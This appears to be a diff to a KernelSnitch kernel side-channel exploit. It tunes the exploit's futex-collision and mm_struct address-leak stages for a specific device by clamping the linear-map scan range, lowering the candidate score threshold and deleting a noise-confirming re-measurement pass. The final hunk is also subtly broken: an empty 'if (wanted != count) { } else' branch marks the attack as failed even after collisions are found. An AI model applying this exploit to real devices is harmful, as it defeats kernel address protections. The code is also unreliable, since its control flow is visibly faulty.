@@ -204,6 +204,11 @@ struct mm_leak_arg {
     struct kernelsnitch_shared_state *ks;
     struct range range;
 };
+/* CDY v5: panic-proven mapped linear span on this device:
+   mapped: 1.4GB/3GB/5.06GB; UNMAPPED (L1 translation fault): 7.93GB. */
+#define LINEAR_SAFE_START 0xffffff8040000000ULL
+#define LINEAR_SAFE_END   0xffffff8180000000ULL
+
 static void *__mm_leak(void *arg)
 {
     struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)arg;
@@ -215,6 +220,13 @@ static void *__mm_leak(void *arg)
         if ((coarse_addr % (1ULL << 40)) == 0)
             if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
         for (size_t slab_addr = coarse_addr; (slab_addr < coarse_addr + COARSE_SZ) && !ks->found; slab_addr += mm_slab_sz) {
+            /* CDY v5: the device RAM top is BELOW the fixed 8GB scan
+               range (7.93GB candidate deref = L1 translation fault).
+               Clamp to the panic-proven mapped span [1GB, 6GB). */
+            if (slab_addr >= LINEAR_SAFE_END)
+                break;
+            if (slab_addr < LINEAR_SAFE_START)
+                continue;
             for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
 
                 if (!ks->mte_enabled) {
@@ -242,11 +254,11 @@ static void *__mm_leak(void *arg)
                        heavy noise leaves >=6 valid ones. Below 6 the leak is
                        treated as FAILED (clean abort, retry the spray) -
                        walking to an unmapped bogus page panics the box. */
-                    if (score >= 4 && score > ks->best_score) {
+                    if (score >= 2 && score > ks->best_score) {
                         ks->best_score = score;
                         ks->mm_cand_cnt = 0;
                     }
-                    if (score >= 4 && score == ks->best_score && ks->mm_cand_cnt < 8) {
+                    if (score >= 2 && score == ks->best_score && ks->mm_cand_cnt < 8) {
                         ks->mm_cands[ks->mm_cand_cnt++] = mm_struct_candidate;
                     }
                 } else {
@@ -380,26 +392,11 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
             if (ks->verbose) pr_info("  %016zx", futex_addr);
         }
     }
-    /* CDY v4: confirmation pass. A single >10x reading can be scheduler
-       noise; a real collision is stable across independent
-       measurements. Only twice-confirmed addresses survive. */
-    if (count > 0) {
-        size_t kept = 1; /* futex_addrs[0] = the piled target itself */
-        for (size_t i = 1; i <= count; ++i) {
-            size_t t = __measure(ks->futex_addrs[i]);
-            if (t > (approx_time * KERNELSNITCH_THRESHOLD_MULT))
-                ks->futex_addrs[kept++] = ks->futex_addrs[i];
-        }
-        count = kept - 1;
-        if (ks->verbose)
-            pr_info("confirmed %zd/%zd collisisons\n", count, wanted);
-    }
-
-    if (count >= 3) {
-        ks->collisions = count + 1; /* futex_addrs[0..count] valid */
+    if (wanted == count) {
         if (ks->verbose) pr_info("found %zd collisisons\n", count);
         ks->state = KERNELSNITCH_COLLISIONS_FOUND;
-    } else {
+    }
+    if (wanted != count) {    } else {
         pr_warning("only found %zd collisions -> cannot continue\n", count);
         ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
     }
